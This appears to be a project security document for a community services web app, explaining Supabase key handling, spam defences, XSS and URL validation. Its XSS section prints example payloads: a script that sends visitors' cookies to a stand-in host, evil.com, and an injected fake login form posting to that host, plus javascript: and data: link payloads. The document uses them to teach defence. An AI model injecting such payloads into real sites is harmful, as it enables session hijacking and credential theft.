# Security Concerns — Deep Dive

Detailed explanation of security issues for the Ukrainians in Texas MVP.

---

## 1. Database Credentials

### Status: ✅ RESOLVED

Two separate Supabase clients with different access levels:

- **Server-side** (`api/_lib/supabase.js`): uses `SUPABASE_SERVICE_KEY` — never exposed to the browser, only used in Vercel serverless functions
- **Browser-side** (`src/lib/supabaseClient.js`): uses `VITE_SUPABASE_ANON_KEY` — safe to expose; security enforced by Row Level Security policies in the database

### How RLS Enforces Security

The `services` table has RLS enabled:

- **Public (anon key):** can only `SELECT` rows where `approved = true`
  - Unapproved submissions, internal notes, and pending records are invisible to the public
- **Authenticated (admin):** full access after logging in via Supabase Auth

This means even if someone finds the anon key in the browser bundle, they can only read approved listings — exactly what the public app already shows. They cannot write, delete, or read unapproved records.

### What to Never Do

```env
# VITE_ prefix exposes the value in the browser bundle
VITE_SUPABASE_SERVICE_KEY=...  # ❌ Never do this
```

The service key bypasses RLS. Keep it server-side only (no `VITE_` prefix).

---

## 2. Form Spam

### Status: ✅ RESOLVED

Using a **custom React form** (`/add-service`) with layered spam protection:

1. **Honeypot field** — hidden field that bots fill in; real users never see it. Submissions with the honeypot filled are rejected.
2. **Manual review** — all submissions start as `approved = false` and require admin approval before appearing on the site. No spam can ever go live automatically.
3. **Server-side validation** — the `/api/submit-service` serverless function validates all fields before inserting into Supabase.

The moderation queue in the admin dashboard (`/admin`) is the primary spam defense.

---

## 3. XSS Vulnerabilities (Cross-Site Scripting)

### The Issue

Users submit text content (business name, description) that you display on the page. If you render this content without sanitization, malicious users can inject JavaScript code that executes in other users' browsers.

### The Risk

**Session Hijacking:**

```html
<!-- Malicious description submitted -->
<script>
  fetch('https://evil.com/steal?cookie=' + document.cookie);
</script>
```

If this renders, every visitor's cookies get sent to the attacker.

**Phishing:**

```html
<!-- Inject a fake login form -->
<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999;">
  <h1>Session Expired</h1>
  <form action="https://evil.com/phish">
    <input name="email" placeholder="Email">
    <input name="password" type="password" placeholder="Password">
    <button>Login</button>
  </form>
</div>
```

### The Recommendation

**React's Built-in Protection:**

React escapes content by default. This is safe:

```jsx
// Safe - React escapes the content
<p>{service.description}</p>
```

**The Danger Zone: `dangerouslySetInnerHTML`**

Never do this with user content:

```jsx
// DANGEROUS - Never do this!
<div dangerouslySetInnerHTML={{ __html: service.description }} />
```

**Recommended Approach for MVP:**

- Stick to React's default escaping (no `dangerouslySetInnerHTML`)
- If you need to display URLs, validate them (see next section)
- Add CSP headers when you deploy

---

## 4. URL Validation

### The Issue

Users submit URLs for their website, Instagram, Facebook, LinkedIn, and Messenger. These URLs are rendered as clickable links. Without validation, malicious URLs can be submitted.

### The Risk

**JavaScript Protocol Attacks:**

```html
<a href="javascript:alert(document.cookie)">Click here</a>
```

If someone submits `javascript:alert('xss')` as their "website", clicking it executes code.

**Data Protocol Attacks:**

```html
<a href="data:text/html,<script>alert('xss')</script>">Link</a>
```

### The Recommendation

**Protocol Whitelist — only allow `http://` and `https://`:**

```javascript
function isValidURL(url) {
  if (!url) return true; // Optional field
  try {
    const parsed = new URL(url);
    return ['http:', 'https:'].includes(parsed.protocol);
  } catch {
    return false;
  }
}
```

**Use `rel="noopener noreferrer"` on all external links:**

```jsx
<a href={service.website} target="_blank" rel="noopener noreferrer">
  Visit website
</a>
```

---

## Summary: Security Implementation Priority

| Priority | Issue | Effort | Status |
|----------|-------|--------|--------|
| 1 | DB credentials | Low (RLS + two clients) | ✅ Supabase anon key + RLS |
| 2 | Form spam | Low (honeypot + manual review) | ✅ Custom form + admin queue |
| 3 | XSS | Low (React default behavior) | ✅ React escaping |
| 4 | URL Validation | Low (validation functions) | ✅ Validated on submit + render |

**Minimum Viable Security for MVP:**

1. ✅ Supabase service key server-side only; anon key + RLS for browser
2. ✅ All submissions require manual admin approval
3. ✅ Don't use `dangerouslySetInnerHTML`
4. ✅ Validate URLs are http/https only
5. ✅ Use `rel="noopener noreferrer"` on external links
